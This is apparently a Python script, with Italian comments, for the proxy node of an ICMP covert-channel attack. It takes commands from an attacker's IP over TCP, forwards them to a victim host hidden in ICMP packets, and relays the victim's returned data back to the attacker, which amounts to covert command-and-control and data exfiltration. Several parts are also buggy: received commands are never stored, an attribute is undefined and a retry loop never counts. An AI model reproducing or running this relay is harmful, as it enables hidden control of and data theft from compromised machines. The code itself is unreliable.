#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import datetime 
import time
import ipaddress
import sys 
import os 
import argparse 
import re 
import random
import threading
from functools import partial 
import json
import type_singleton as singleton
import socket

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 



def find_local_ip():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        print(s.getsockname()[0])
        s.close()

#------------------------------------
def callback_wait_data_from_vicitm(event_pktconn:threading.Event, data_lock:threading.Lock, data_received:list=[]): 
    def callback(packet):
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            checksum=mymethods.calc_checksum(packet[Raw].load)
            #print(f"Payload received:\t{packet[Raw].load}")
            print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}")
            if packet[ICMP].id==checksum: 
                update_data_received(
                    [packet[ICMP].id,packet[ICMP].seq,packet[Raw].load]
                    ,data_lock
                    ,data_received
                )
                if com.LAST_PACKET.encode() in packet[Raw].load:
                    print(f"The packet contains {com.LAST_PACKET}\t{packet[Raw].load}")
                    com.set_threading_Event(event_pktconn) 
    return callback
    

def callback_wait_command_from_attacker(command_to_redirect:str, event_pktconn:threading.Event=None, ): 
    def callback(packet): 
        print(f"callback wait_command_from_attacker received:\n\t{packet.summary()}")
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
            #solo un proxy verrà usato per inoltrare il messaggio; tutti gli altri dovranno ricevere i dati dalla vittima
            #una proxy può o passare il comando (riceve CONFIRM_COMMAND) oppure ascoltare direttamente i dati (riceve START)
            if com.START.encode() in packet[Raw].load:
                command_to_redirect=None 
                com.set_threading_Event(event_pktconn) 
                return
            if com.END_COMMUNICATION.encode() in packet[Raw].load:
                command_to_redirect=com.END_COMMUNICATION 
                com.set_threading_Event(event_pktconn) 
                return
            command=packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,"")
            checksum=(com.CONFIRM_COMMAND+command).encode()
            checksum=mymethods.calc_checksum(checksum) #per avere conferma di avere il comando corretto
            print(f"Command to redirect:\t{command}")
            print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}") 
            if packet[ICMP].id == checksum and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
                command_to_redirect=command 
                com.set_threading_Event(event_pktconn) 
                return
            print("Caso non contemplato") 
    return callback
    

def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address|ipaddress.IPv6Address=None, ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None, event_pktconn:threading.Event=None): 
    def callback(packet):
        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
            print(f"Ricevuto pacchetto da {packet[IP].src}...")
            confirm_text=com.CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
            check_sum=mymethods.calc_checksum(confirm_text.encode()) 
            if check_sum==packet[ICMP].id and ip_vittima.compressed==packet[IP].src: 
                print(f"il pacchetto ha confermato la connessione...") 
                com.set_threading_Event(event_pktconn) 
                return
        print(f"il pacchetto non ha confermato la connessione...")
    return callback 



#--------------------------------
def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

def update_victim_end_communication(ip_vittima):
    try:
        com.is_valid_ipaddress_v4(ip_vittima)
    except Exception as e:
        raise Exception(f"update_victim_end_communication: {e}")
    data=com.END_COMMUNICATION
    if com.send_packet(data.encode(),ip_vittima):
        print(f"{ip_vittima}: la vittima è stata aggiornata")
        return
    print(f"{ip_vittima}: la vittima non è stata aggiornata")

#--------------------------------
def setup_thread_4_victim(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None): 
    try: 
        #com.is_callback_function(callback_function)
        if not isinstance(ip_host, ipaddress.IPv4Address) and not isinstance(ip_host, ipaddress.IPv6Address):
            raise Exception("ip_host non è ne un IPv4Address ne un IPv6Address")
        if not callable(callback_function):
            raise ValueError("La callback function passata non è chiamabile")  
    except Exception as e:
        raise Exception(f"setup_thread_4_victim: {e}")
   
    thread_lock=threading.Lock()
    thread_response={ip_host.compressed:False}
    thread_4_vittima={ip_host.compressed:threading.Thread( target=callback_function)} 
    print(f"Lock creato:\t{thread_lock}")
    print(f"Thread creato:\t{thread_4_vittima}")
    print(f"Risposte create:\t{thread_response}")

    return thread_lock, thread_response, thread_4_vittima

#-------------------------------- 
def check_value_in_parser(args):  
    if not isinstance(args,argparse.Namespace): 
        raise Exception(f"Argomento parser non è istanza di argparse.Namespace")  
    if not isinstance(args.ip_attaccante,str): 
        raise Exception(f"--ip_attaccante non specificato: {args.ip_attaccante}")
    if not isinstance(args.ip_vittima,str):  
        raise Exception(f"--ip_vittima non specificato: {args.ip_vittima}") 
    return True

def get_args_from_parser(): 
    parser = argparse.ArgumentParser()
    #parser.add_argument("--ip_host",type=str, help="IP dell'host")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    try:
        args, unknown =mymethods.check_for_unknown_args(parser)  
        if len(unknown) > 0: 
            raise Exception(f"Argomenti sconosciuti: {unknown}") 
        if check_value_in_parser(args):  
            return args
    except Exception as e:
        mymethods.print_parser_supported_arguments(parser)
        raise Exception(f"get_args_from_parser: {e}")

class Proxy:  
    def __init__(self):  
        try:
            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
                raise ValueError("args non è istanza di argparse.Namespace")
            dict_values={
                "ip_attaccante":args.ip_attaccante 
                ,"ip_vittima":args.ip_vittima
            } 
            self.ip_attaccante=ipaddress.ip_address(dict_values.get("ip_attaccante") )
            print(f"IP attaccante: {type(self.ip_attaccante)} : {self.ip_attaccante}")
            self.ip_vittima=ipaddress.ip_address(dict_values.get("ip_vittima")) 
            print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
            _,ip_host=mymethods.iface_src_from_IP(self.ip_attaccante)
            self.ip_host=ipaddress.ip_address(ip_host)
            print(f"IP host: {type(self.ip_host)} : {self.ip_host}")
        except Exception as e: 
            print(f"_init_ setup args: {e}")
            exit(1)
        
        #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            print(f"Server listening: {s}")  
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
            s.bind(("192.168.56.104", 4567))  #(socket.gethostname(), 4567)
            s.listen(3)
            self.conn_to_attacker, attacker_addr=s.accept()
            if ipaddress.ip_address(attacker_addr[0]).compressed != self.ip_attaccante.compressed:
                self.conn_to_attacker.close()
            else:
                #with self.conn_to_attacker:   
                bytes_received=self.conn_to_attacker.recv(1024)
                if not bytes_received or bytes_received.decode()!=com.CONFIRM_ATTACKER:
                    print(f"Invalid data from {attacker_addr}: {bytes_received}") 
                    self.conn_to_attacker.close()  
                    exit(0) 
        self.conn_to_attacker.sendall(com.CONFIRM_PROXY.encode()) 
        print("Socket con attaccante stabilito")
        
        try: 
            #connection_with_victim
            #self.thread_lock, self.thread_response, self.thread_list 
            self.thread_lock, self.thread_response, self.thread_4_vittima=setup_thread_4_victim(
                self.wait_conn_from_victim 
                ,self.ip_host
            )
            thread=self.thread_4_vittima.get(self.ip_host.compressed)
            thread.start() 
            result=self.confirm_conn_to_victim()
            thread.join() 
            result=self.thread_response.get(self.ip_host.compressed) and result 
        except Exception as e: 
            print(f"_init_ conn victim: {e}")
            exit(1)
        if result:
            print(f"il proxy {self.ip_host} è connesso alla vittima {self.ip_vittima}")  
        else:
            print(f"il proxy {self.ip_host} non è connesso alla vittima {self.ip_vittima}")
        #Una macchina non connessa alla vittima non serve. Quindi l'attaccante deve saperlo
        data=com.CONFIRM_VICTIM+self.ip_vittima.compressed+self.ip_host.compressed+str(result)
        self.conn_to_attacker.sendall(data.encode()) 
        
        bytes_received=self.conn_to_attacker.recv(1024)
        
        try: 
            #send_command_and_wait_data
            comando=self.wait_command_from_attacker()
            self.data_lock=threading.Lock()
            while comando not in com.exit_cases: 
                self.data_received=[]
                thread_data=threading.Thread(
                    target=self.wait_data_from_vicitm
                    #,args=[self.ip_vittima]
                )
                thread_data.start()
                print(f"Il comando da inoltrare è {comando}") 
                if comando is not None:
                    data=com.CONFIRM_COMMAND+comando
                    if not self.redirect_command_to_victim(data.encode()):
                        com.set_threading_Event(self.event_pktconn) 
                thread_data.join() 
                if len(self.data_received)<=0:
                    self.redirect_data_to_attacker([com.LAST_PACKET])
                self.redirect_data_to_attacker(self.data_received)
                #return self.data_received 
                comando=self.wait_command_from_attacker()
            print("Interruzione del programma")
            update_victim_end_communication(self.ip_vittima)
        except Exception as e:
            print("_ini_ aaa aaa: {e}")
            exit(1)
    
    def wait_conn_from_victim(self):
        #print("\n(─‿─)\twait_conn_from_victim\n")
        confirm_text=com.CONFIRM_VICTIM+self.ip_vittima.compressed+self.ip_host.compressed
        checksum=mymethods.calc_checksum(confirm_text.encode())
        interface,_=mymethods.iface_src_from_IP(self.ip_vittima)
        self.event_pktconn=com.get_threading_Event()
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_conn_from_victim"
            ,self.ip_vittima
            ,checksum
        ) 

        try:
            args={
                "filter":filter
                ,"count":1 
                ,"prn":callback_wait_conn_from_victim(
                    self.ip_vittima
                    ,self.ip_host
                    ,self.event_pktconn
                )
                #,"store":True 
                ,"iface":interface
            } 
            self.sniffer,self.pkt_timer=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn)
        except Exception as e:
            raise Exception(f"wait_conn_from_victim: {e}")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.pkt_timer): 
            print(f"La connessione per {self.ip_vittima} è confermata") 
            com.update_thread_response(
                 self.ip_host
                ,self.thread_lock
                ,self.thread_response
                ,True
            )
            return True 
        print(f"La connessione per {self.ip_vittima} non è confermata") 
        return False
    
    def confirm_conn_to_victim(self): 
        print("\n\t(─‿─)\tconfirm_conn_to_victim\n") 
        confirm_text=com.CONFIRM_PROXY+self.ip_vittima.compressed
        if com.send_packet(confirm_text.encode() , self.ip_vittima): 
            print(f"Reply: la vittima {self.ip_vittima} ha risposto") 
            return True 
        print(f"No Reply: la vittima {self.ip_vittima} non ha risposto") 
        return False
    
    def update_attacker_about_conn_to_victim(self,risultato:bool=None): 
        print("\n\t(─‿─)\tupdate_attacker_about_conn_to_victim\n")
        try:
            com.is_boolean(risultato)
        except Exception as e:
            raise Exception(f"update_attacker_about_conn_to_victim: {e}")
        data=com.CONFIRM_VICTIM+self.ip_vittima.compressed+self.ip_host.compressed+str(risultato)
        if com.send_packet(data.encode(),self.ip_attaccante):
             print(f"{self.ip_attaccante} aggiornamento confermato...")
             return True
        print(f"{self.ip_attaccante} aggiornamento non confermato...")
        return False
    
           
    
    def wait_command_from_attacker(self):
        print(f"Waiting the command from {self.ip_attaccante}") 
        self.command_to_redirect=None
        self.event_pktconn=com.get_threading_Event()

        interface,_=mymethods.iface_src_from_IP(self.ip_attaccante)
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_command_from_attacker"
            ,ip_src=self.ip_attaccante
            ,ip_dst=self.ip_host 
        )
        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_command_from_attacker(
                self.command_to_redirect
                ,self.event_pktconn
            )
            #,"store":True 
            ,"iface":interface
        }
        try: 
            self.sniffer,self.timeout_timer=com.sniff_packet(
                 args
                ,timeout_time=None
                ,event=self.event_pktconn
            )
            com.wait_threading_Event(self.event_pktconn)  
        except Exception as e:
            raise Exception(f"wait_command_from_attacker: {e}") 
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.timeout_timer):
            print(f"Il proxy ha ricevuto il comando? {self.command_to_redirect is not None}")
            try:
                if com.is_string(self.command_to_redirect):
                    return self.command_to_redirect
            except Exception as e:
                print(f"wait_command_from_attacker: {e}")
        return None
    
    def wait_data_from_vicitm(self):
        print(f"si aspettano i dati da {self.ip_vittima}")
        self.event_pktconn=com.get_threading_Event()
        filter=singleton.AttackType().get_filter_connection_from_function(
            "wait_data_from_vicitm"
            ,ip_src=self.ip_vittima
            ,ip_dst=self.ip_host
        )
        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_data_from_vicitm(
                self.event_pktconn
            )
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(self.gateway_vittima)[1]
        }
        try: 
            self.sniffer, self.timeout_timer=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.timeout_timer): 
            print(f"Proxy: {self.ip_vittima} ha mandato i dati") 
            return True
        print(f"Proxy: {self.ip_vittima} non ha mandato i dati") 
        return False
    
    def redirect_command_to_victim(self,command_to_redirect):
            print(f"Sendin command {command_to_redirect} to {self.ip_vittima}") 
            if com.send_packet(command_to_redirect,self.ip_vittima):
                print(f"la vittima ha ricevuto il comando")
                return True
            print(f"la vittima non ha ricevuto il comando")
            return False 
    
    def redirect_data_to_attacker(self,data_received:list=None): 
        try:
            if not com.is_list(data_received) or len(data_received)<=0:
                raise Exception(f"redirect_data_to_attacker: dati ricevuti non validi")
        except Exception as e:
            raise Exception(f"redirect_data_to_attacker: {e}")
        print(f"data_received: {data_received}")
        for id,seq,data in data_received:
            print(f"prova id: {str(id)[0]}")
            data=data if isinstance(data,bytes) else data.encode() 
            num_times_not_received=0
            while not com.send_packet(data, self.ip_attaccante,icmp_seq=seq) and num_times_not_received<=3:
                print("l'attaccante non ha ricevuto i dati")
                time.sleep(1)
            if num_times_not_received>3:
                raise Exception(f"redirect_data_to_attacker: impossibilità nel mandare i dati all'attaccante")
        print(f"dati mandati all'attaccante")



if __name__=="__main__":  
    Proxy()